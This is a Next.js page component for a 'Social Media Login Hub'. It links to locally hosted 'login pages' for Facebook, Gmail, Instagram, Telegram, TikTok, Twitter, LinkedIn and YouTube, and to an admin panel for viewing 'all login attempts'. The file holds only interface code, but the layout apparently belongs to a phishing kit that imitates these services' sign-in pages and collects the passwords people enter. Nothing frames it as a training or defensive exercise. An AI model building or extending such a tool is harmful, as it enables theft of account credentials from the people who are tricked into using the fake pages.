import Link from "next/link"
import { Facebook, Mail, Instagram, Send, Music, Twitter, Linkedin, Youtube } from "lucide-react"

export default function HomePage() {
  const platforms = [
    {
      name: "Facebook",
      icon: Facebook,
      href: "/facebook",
      color: "bg-blue-600 hover:bg-blue-700",
      textColor: "text-white",
    },
    {
      name: "Gmail",
      icon: Mail,
      href: "/gmail",
      color: "bg-red-500 hover:bg-red-600",
      textColor: "text-white",
    },
    {
      name: "Instagram",
      icon: Instagram,
      href: "/instagram",
      color:
        "bg-gradient-to-r from-purple-500 via-pink-500 to-orange-400 hover:from-purple-600 hover:via-pink-600 hover:to-orange-500",
      textColor: "text-white",
    },
    {
      name: "Telegram",
      icon: Send,
      href: "/telegram",
      color: "bg-blue-500 hover:bg-blue-600",
      textColor: "text-white",
    },
    {
      name: "TikTok",
      icon: Music,
      href: "/tiktok",
      color: "bg-black hover:bg-gray-800",
      textColor: "text-white",
    },
    {
      name: "Twitter",
      icon: Twitter,
      href: "/twitter",
      color: "bg-sky-500 hover:bg-sky-600",
      textColor: "text-white",
    },
    {
      name: "LinkedIn",
      icon: Linkedin,
      href: "/linkedin",
      color: "bg-blue-700 hover:bg-blue-800",
      textColor: "text-white",
    },
    {
      name: "YouTube",
      icon: Youtube,
      href: "/youtube",
      color: "bg-red-600 hover:bg-red-700",
      textColor: "text-white",
    },
  ]

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-12 px-4">
      <div className="max-w-6xl mx-auto">
        <div className="text-center mb-12">
          <h1 className="text-4xl font-bold text-gray-800 mb-4">Social Media Login Hub</h1>
          <p className="text-lg text-gray-600">Access all your favorite social platforms in one place</p>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
          {platforms.map((platform) => {
            const IconComponent = platform.icon
            return (
              <Link
                key={platform.name}
                href={platform.href}
                className={`${platform.color} ${platform.textColor} rounded-xl p-6 text-center transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl`}
              >
                <IconComponent className="w-12 h-12 mx-auto mb-3" />
                <h3 className="text-lg font-semibold">{platform.name}</h3>
              </Link>
            )
          })}
        </div>

        <div className="text-center mt-12">
          <p className="text-gray-500 text-sm mb-4">Click on any platform to access its login page</p>

          {/* Admin Panel Link */}
          <div className="mt-8 p-6 bg-white rounded-xl shadow-lg border-2 border-dashed border-gray-300">
            <h3 className="text-xl font-semibold text-gray-800 mb-2">Admin Panel</h3>
            <p className="text-gray-600 mb-4">View and manage all login attempts</p>
            <Link
              href="/admin"
              className="inline-flex items-center px-6 py-3 bg-gray-800 text-white rounded-lg font-semibold hover:bg-gray-900 transition-colors"
            >
              <span className="mr-2">⚙️</span>
              Access Admin Panel
            </Link>
          </div>
        </div>
      </div>
    </div>
  )
}
